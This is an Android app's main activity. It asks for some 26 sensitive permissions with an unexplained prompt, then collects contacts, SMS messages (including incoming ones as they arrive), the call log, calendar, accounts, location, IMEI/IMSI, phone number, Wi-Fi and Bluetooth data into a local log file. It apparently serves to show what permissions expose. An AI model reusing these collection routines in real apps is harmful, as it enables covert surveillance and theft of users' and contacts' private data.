package com.example.appbq_full;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;
import android.widget.Toast;
import android.widget.Button;

import java.io.File;
import java.io.FileWriter;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Set;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_CHECK = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button buttonRequest =findViewById(R.id.button);
        buttonRequest.setOnClickListener(mLayout -> {
            if (ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.ACCESS_COARSE_LOCATION) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.ACCESS_FINE_LOCATION) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.ADD_VOICEMAIL) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.ANSWER_PHONE_CALLS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.BODY_SENSORS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.CALL_PHONE) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.CAMERA) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.GET_ACCOUNTS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.PROCESS_OUTGOING_CALLS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_CALENDAR) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_CALL_LOG) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_CONTACTS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_EXTERNAL_STORAGE) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_PHONE_NUMBERS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_PHONE_STATE) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_SMS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.RECEIVE_MMS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.RECEIVE_SMS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.RECEIVE_WAP_PUSH) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.RECORD_AUDIO) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.SEND_SMS) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.USE_FINGERPRINT) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.USE_SIP) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.WRITE_CALENDAR) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.WRITE_CALL_LOG) +
                ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.WRITE_CONTACTS)
                ==PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(MainActivity.this, "Permissions are granted!",
                        Toast.LENGTH_SHORT).show();
            } else {
                requestAllPermissions();
            }
        });
    }

    private void requestAllPermissions() {
        if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.ACCESS_COARSE_LOCATION) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.ACCESS_FINE_LOCATION) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.ADD_VOICEMAIL) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.ANSWER_PHONE_CALLS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.BODY_SENSORS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.CALL_PHONE) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.CAMERA) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.GET_ACCOUNTS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.PROCESS_OUTGOING_CALLS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.READ_CALENDAR) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.READ_CALL_LOG) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.READ_CONTACTS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.READ_EXTERNAL_STORAGE) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.READ_PHONE_NUMBERS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.READ_PHONE_STATE) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.READ_SMS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.RECEIVE_MMS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.RECEIVE_SMS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.RECEIVE_WAP_PUSH) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.RECORD_AUDIO) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.SEND_SMS) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.USE_FINGERPRINT) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.USE_SIP) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.WRITE_CALENDAR) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.WRITE_CALL_LOG) ||
            ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.WRITE_CONTACTS)
            ) {

            new AlertDialog.Builder(this)
                    .setTitle("Permissions needed")
                    .setMessage("Please grant permissions!")
                    .setPositiveButton("ok", (dialog, which) -> ActivityCompat.requestPermissions
                            (MainActivity.this, new String[] {
                                    Manifest.permission.ACCESS_COARSE_LOCATION,
                                    Manifest.permission.ACCESS_FINE_LOCATION,
                                    Manifest.permission.ADD_VOICEMAIL,
                                    Manifest.permission.ANSWER_PHONE_CALLS,
                                    Manifest.permission.BODY_SENSORS,
                                    Manifest.permission.CALL_PHONE,
                                    Manifest.permission.CAMERA,
                                    Manifest.permission.GET_ACCOUNTS,
                                    Manifest.permission.PROCESS_OUTGOING_CALLS,
                                    Manifest.permission.READ_CALENDAR,
                                    Manifest.permission.READ_CALL_LOG,
                                    Manifest.permission.READ_CONTACTS,
                                    Manifest.permission.READ_EXTERNAL_STORAGE,
                                    Manifest.permission.READ_PHONE_NUMBERS,
                                    Manifest.permission.READ_PHONE_STATE,
                                    Manifest.permission.READ_SMS,
                                    Manifest.permission.RECEIVE_MMS,
                                    Manifest.permission.RECEIVE_SMS,
                                    Manifest.permission.RECEIVE_WAP_PUSH,
                                    Manifest.permission.RECORD_AUDIO,
                                    Manifest.permission.SEND_SMS,
                                    Manifest.permission.USE_FINGERPRINT,
                                    Manifest.permission.USE_SIP,
                                    Manifest.permission.WRITE_CALENDAR,
                                    Manifest.permission.WRITE_CALL_LOG,
                                    Manifest.permission.WRITE_CONTACTS
                            }, PERMISSION_CHECK))
                    .setNegativeButton("cancel", (dialog, which) -> dialog.dismiss())
                    .create().show();

        } else {
            ActivityCompat.requestPermissions(this,
                    new String[] {
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.ADD_VOICEMAIL,
                            Manifest.permission.ANSWER_PHONE_CALLS,
                            Manifest.permission.BODY_SENSORS,
                            Manifest.permission.CALL_PHONE,
                            Manifest.permission.CAMERA,
                            Manifest.permission.GET_ACCOUNTS,
                            Manifest.permission.PROCESS_OUTGOING_CALLS,
                            Manifest.permission.READ_CALENDAR,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.READ_PHONE_NUMBERS,
                            Manifest.permission.READ_PHONE_STATE,
                            Manifest.permission.READ_SMS,
                            Manifest.permission.RECEIVE_MMS,
                            Manifest.permission.RECEIVE_SMS,
                            Manifest.permission.RECEIVE_WAP_PUSH,
                            Manifest.permission.RECORD_AUDIO,
                            Manifest.permission.SEND_SMS,
                            Manifest.permission.USE_FINGERPRINT,
                            Manifest.permission.USE_SIP,
                            Manifest.permission.WRITE_CALENDAR,
                            Manifest.permission.WRITE_CALL_LOG,
                            Manifest.permission.WRITE_CONTACTS
                    }, PERMISSION_CHECK);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == PERMISSION_CHECK)  {
            if ((grantResults.length > 0) &&
                    (grantResults[0] + grantResults[1] + grantResults[2] + grantResults[3]
                    + grantResults[4] + grantResults[5] + grantResults[6] + grantResults[7]
                    + grantResults[8] + grantResults[9] + grantResults[10] + grantResults[11]
                    + grantResults[12] + grantResults[13] + grantResults[14] + grantResults[15]
                    + grantResults[16] + grantResults[17] + grantResults[18] + grantResults[19]
                    + grantResults[20] + grantResults[21] + grantResults[22] + grantResults[23]
                    + grantResults[24] + grantResults[25]
                            == PackageManager.PERMISSION_GRANTED) ) {
                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
            }
        }

        logToFile(this, "--- ACCOUNT --- \n" + getAcc());
        logToFile(this, "--- CONTACTS --- \n" + getContacts());
        logToFile(this, "--- PROFILE --- \n" + getProfile());
        logToFile(this, "--- CALENDAR --- \n" + getCalendar());
        logToFile(this, "--- READ SMS --- \n" + readSms());
        logToFile(this, "--- LOCATION --- \n" + getLoc());
        logToFile(this, "--- TELEPHONY --- \n" + getTelephonyInfo());
        logToFile(this, "--- BUILD --- \n" + getBuildInfo());
        logToFile(this, "--- CALL LOG --- \n" + getCallLog());
        logToFile(this, "--- WI-FI INFO --- \n" + wifiInfo());
        logToFile(this, "--- PREVIOUSLY CONNECTED NETWORKS --- \n" + prevConnNetworks());
        logToFile(this, "--- WI-FI SCAN --- \n" + getWifiScan());
        logToFile(this, "--- BT INFO --- \n" + getBtInfo());
        logToFile(this, "--- PAIRED BT --- \n" + getPairedBt());

        receiveSms();
        btDiscoverDevices();
    }


    private void logToFile(Context context, String sBody) {
        File dir = new File(context.getFilesDir(), "permLogs");
        if (!dir.exists()){
            dir.mkdir();
        }
        try {
            File gpxfile = new File(dir, "plogs.txt");
            FileWriter writer = new FileWriter(gpxfile, true);
            writer.append(sBody).append("\n\n");
            writer.flush();
            writer.close();
            Toast.makeText(this, "Data logged to " + context.getFilesDir(), Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getAcc() {
        List<String> accountList = new ArrayList<>();
        Pattern gmailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(this).getAccounts();
        for (Account account : accounts) {
            if (gmailPattern.matcher(account.name).matches()) {
                accountList.add(account.name);
            }
        }
        return accountList.toString();
    }

    private String getContacts() {
        ArrayList<String> contactList = new ArrayList<String>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                contactList.add(name);
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contactList.add(phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }
        return contactList.toString();
    }

    private String getProfile() {
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(ContactsContract.Profile.CONTENT_URI, null, null, null, null);
        List<String> profile = new ArrayList<>();
        while (c.moveToNext()) {
            profile.add("Name: " + c.getString(c.getColumnIndex(ContactsContract.Profile.DISPLAY_NAME)) +
                    " - ID: " + c.getString(c.getColumnIndex(ContactsContract.Profile._ID)));
        }
        c.close();
        return profile.toString();
    }

    private String getCalendar() {
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(CalendarContract.Events.CONTENT_URI, null, null, null, null);
        List<String> calendarInfo = new ArrayList<>();
        while (c.moveToNext()) {
            Date startDate = new Date(c.getLong(c.getColumnIndex(CalendarContract.Events.DTSTART)));
            Date endDate = new Date(c.getLong(c.getColumnIndex(CalendarContract.Events.DTEND)));
            calendarInfo.add("\naccount name: " + c.getString(c.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME)) +
                    "\ncalendar display name: " + c.getString(c.getColumnIndex(CalendarContract.Events.CALENDAR_DISPLAY_NAME)) +
                    "\ntitle: " + c.getString(c.getColumnIndex(CalendarContract.Events.TITLE)) +
                    "\nlocation: " + c.getString(c.getColumnIndex(CalendarContract.Events.EVENT_LOCATION)) +
                    "\nevent start: " + startDate +
                    "\nevent end: " + endDate);
        }
        c.close();
        return calendarInfo.toString();
    }

    private String readSms() {
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),
                null, null, null, null);
        String message = "";
        if (c.moveToFirst()) {
            do {
                for (int i = 0; i < c.getColumnCount(); i++) {
                    if (c.getColumnName(i).equals("date")) {
                        Date date = new Date(c.getLong(i));
                        message += " Date: " + date +" / ";
                    }
                    else if (c.getColumnName(i).equals("address")) {
                        message += " Address: " + c.getString(i) + " / ";
                    }
                    else if (c.getColumnName(i).equals("body")) {
                        message += " Message body: " + c.getString(i) + "\n";
                    }
                }
            } while (c.moveToNext());
        } else {
            return "No messages to log!";
        }
        c.close();
        return message;
    }

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    List<String> receivedMessage = new ArrayList<>();
    private final BroadcastReceiver smsBr = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Bundle bundle = intent.getExtras();
            SmsMessage[] messages;
            String messageAddr = "";
            String body = "";
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < messages.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        messageAddr += messages[i].getDisplayOriginatingAddress();
                        body += messages[i].getMessageBody();
                    }
                    receivedMessage.add("Message Address: " + messageAddr +
                            ", Message body: " + body +
                            ", Time received: " + Calendar.getInstance().getTime());
                    logToFile(getApplicationContext(), "--- SMS RECEIVER ---");
                    logToFile(getApplicationContext(), receivedMessage.toString());
                } catch (Exception e) {
                    Log.d("Exception caught ", e.getMessage());
                }
            }
            else {
                logToFile(getApplicationContext(), "\nBundle is null.");
            }
        }
    };

    @Override
    protected void onDestroy() {
        unregisterReceiver(smsBr);
        unregisterReceiver(btBroadcastReceiver);
        super.onDestroy();
    }

    private void receiveSms() {
        IntentFilter filter = new IntentFilter(SMS_RECEIVED);
        registerReceiver(smsBr, filter);
    }

    private String getLoc() {
        LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        List<String> providers = lm.getProviders(true);
        Location loc = null;

        if (getApplicationContext().checkCallingOrSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            for (int i = providers.size() - 1; i >= 0; i--) {
                loc = lm.getLastKnownLocation(providers.get(i));
                if (loc != null) break;
            }
        }
        double[] pos = new double[2];
        if (loc != null) {
            pos[0] = loc.getLatitude();
            pos[1] = loc.getLongitude();
        }
        String s = pos[0] + ", " + pos[1];
        return s;
    }

    //@SuppressLint("MissingPermission")
    private String getTelephonyInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        List<String> telInfo = new ArrayList<>();

        String phoneType = null;
        if (tm.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM)
            phoneType = "Phone Type: GSM\n";
        else if (tm.getPhoneType() == TelephonyManager.PHONE_TYPE_CDMA)
            phoneType = "Phone Type: CDMA\n";
        telInfo.add(phoneType);
        telInfo.add("IMEI: " + tm.getDeviceId() + "\n");
        telInfo.add("IMSI: " + tm.getSubscriberId() + "\n");
        telInfo.add("Network Operator: " + tm.getNetworkOperatorName() + "\n");
        telInfo.add("SIM Operator: " + tm.getSimOperatorName() + " - " + tm.getSimOperator() + "\n");
        telInfo.add("Phone number: " + tm.getLine1Number());
        return telInfo.toString();
    }

    private String getBuildInfo() {
        List<String> buildInfo = new ArrayList<>();

        buildInfo.add("Manufacturer: " + Build.MANUFACTURER);
        buildInfo.add("Model: " + Build.MODEL);
        buildInfo.add("Serial number: " + Build.SERIAL);
        buildInfo.add("Bootloader: " + Build.BOOTLOADER);
        buildInfo.add("Display: " + Build.DISPLAY);

        return buildInfo.toString();
    }

    private String getCallLog() {
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        List<String> callList = new ArrayList<>();
        while (c.moveToNext()) {
            Date date = new Date(c.getLong(c.getColumnIndex(CallLog.Calls.DATE)));
            callList.add("\nPhone Number: " + c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)) +
                    " Call Type: " + c.getString(c.getColumnIndex(CallLog.Calls.TYPE)) +
                    " Date: " + date +
                    " Duration: " + c.getString(c.getColumnIndex(CallLog.Calls.DURATION)));
        }

        c.close();
        return callList.toString();
    }

    private String wifiInfo() {
        WifiManager wifiManager = (WifiManager)
                this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        String wifiMac = "Device Wi-Fi Mac address: " + wifiManager.getConnectionInfo().getMacAddress();
        String connectedAp = " - Connected Wi-Fi: " + wifiManager.getConnectionInfo().toString();
        return wifiMac + connectedAp;
    }

    @SuppressLint("MissingPermission")
    private String prevConnNetworks() {
        WifiManager wifiManager = (WifiManager)
                this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        List<WifiConfiguration> configuredList = wifiManager.getConfiguredNetworks();
        return configuredList.toString();
    }

    private String getWifiScan() {
        WifiManager wifiManager = (WifiManager)
                this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifiManager.startScan();
        List<ScanResult> scanResults = wifiManager.getScanResults();
        return scanResults.toString();
    }

    /*private String getConnBtDevice() {
        BluetoothManager bluetoothManager = (BluetoothManager)
                this.getApplicationContext().getSystemService(BLUETOOTH_SERVICE);
        List<BluetoothDevice> btDevice = bluetoothManager.getConnectedDevices(GATT_SERVER);

        return btDevice.toString();
    }*/

    private String getBtInfo() {
        return "\nBluetooth MAC Address: " + BluetoothAdapter.getDefaultAdapter().getAddress() + "\n";
    }

    List<String> btDeviceList = new ArrayList<>();
    private final BroadcastReceiver btBroadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (BluetoothDevice.ACTION_FOUND.equals(action)) {
                BluetoothDevice btDevice = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                btDeviceList.add("--- Name: " + btDevice.getName() +
                        " Address: " + btDevice.getAddress() +
                        " Contents: " + btDevice.describeContents() +
                        " Class: " + btDevice.getBluetoothClass() +
                        " Type: " + btDevice.getType() +
                        " UUIDs: " + btDevice.getUuids() + "---");
            }
            logToFile(getApplicationContext(), "\n--- BT DISCOVER DEVICES --- \n");
            logToFile(getApplicationContext(), btDeviceList.toString());
        }
    };

    private void btDiscoverDevices() {
        BluetoothAdapter bluetoothAdapter = ((BluetoothManager)
                this.getApplicationContext().getSystemService(Context.BLUETOOTH_SERVICE)).getAdapter();

        bluetoothAdapter.startDiscovery();

        IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_FOUND);
        registerReceiver(btBroadcastReceiver, filter);
    }

    private String getPairedBt() {
        BluetoothAdapter bluetoothAdapter = ((BluetoothManager)
                this.getApplicationContext().getSystemService(Context.BLUETOOTH_SERVICE)).getAdapter();

        Set<BluetoothDevice> btDeviceList = bluetoothAdapter.getBondedDevices();

        List<String> list = new ArrayList<>();
        for(BluetoothDevice bluetoothDevice : btDeviceList) {
            list.add("--- Name: " + bluetoothDevice.getName());
            list.add("Address: " + bluetoothDevice.getAddress());
            list.add("Contents: " + bluetoothDevice.describeContents());
            list.add("Class: " + bluetoothDevice.getBluetoothClass());
            list.add("Type: " + bluetoothDevice.getType());
            list.add("UUIDs: " + bluetoothDevice.getUuids() + "---");
        }
        return list.toString();
    }

}
